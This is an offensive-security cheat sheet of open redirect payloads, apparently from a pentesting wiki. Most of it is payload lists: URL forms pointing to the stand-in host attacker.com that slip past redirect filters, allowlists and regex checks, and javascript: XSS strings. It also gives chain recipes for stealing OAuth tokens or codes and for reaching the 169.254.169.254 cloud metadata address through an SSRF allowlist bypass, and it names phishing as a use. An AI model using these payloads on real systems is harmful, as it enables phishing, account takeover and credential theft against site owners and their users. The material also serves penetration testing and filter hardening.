---
title: "Payloads: Open Redirect"
type: payloads
tags: [payloads, open-redirect, ssrf, oauth, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: Open Redirect

Redirect-filter bypasses. Useful standalone (phishing) and as a chain primitive for OAuth `redirect_uri` theft and SSRF allowlist bypass. See [[open-redirect]]; chains -> [[oauth-saml]], [[wiki/payloads/ssrf]].

## Where found
`?url= ?next= ?redirect= ?return= ?returnUrl= ?dest= ?destination= ?continue= ?r= ?u= ?target= ?redir= ?redirect_uri= ?callback=`, `Location` headers, JS `location=`/`window.open`, meta-refresh.

## Bypass payloads (target = your domain)
```
https://attacker.com
//attacker.com                         /\attacker.com        \/\/attacker.com
https:attacker.com                     https:/attacker.com
http://target.com.attacker.com         (suffix)
http://attacker.com/target.com         (path, if it checks "contains target.com")
http://attacker.com#target.com         http://attacker.com?x=target.com
http://attacker.com\@target.com        http://target.com@attacker.com   (userinfo)
http://attacker。com  http://attacker%E3%80%82com   (unicode dot)
http://attacker.com%2f%2e%2e
%09//attacker.com   %00//attacker.com   (whitespace/null prefix)
javascript:alert(1)   data:text/html,...   (if rendered, -> XSS)
////attacker.com   /%5cattacker.com   /%2f%2fattacker.com
```

## Allowlist / regex bypasses
```
if it requires "target.com": target.com.attacker.com , attacker.com/target.com , attacker.com#target.com
if it strips "http://": https://attacker , //attacker , %68ttp://
if it blocks "//": /\/attacker.com , \/\/attacker.com , /%2fattacker.com
double-encode: %252f%252fattacker.com
```

## Chains
```
OAuth: redirect_uri to an on-domain open redirect -> token/code exfil (see [[oauth-saml]])
SSRF allowlist: allowed-host open-redirect -> 302 to 169.254.169.254 (see [[ssrf]])
CRLF in a redirect param -> response splitting (see crlf)
```

## Real-world
Open redirect alone is low severity, but as an OAuth `redirect_uri` chain or SSRF-allowlist bypass it escalates to account takeover / metadata-cred theft - the reason it stays a high-signal recon target.
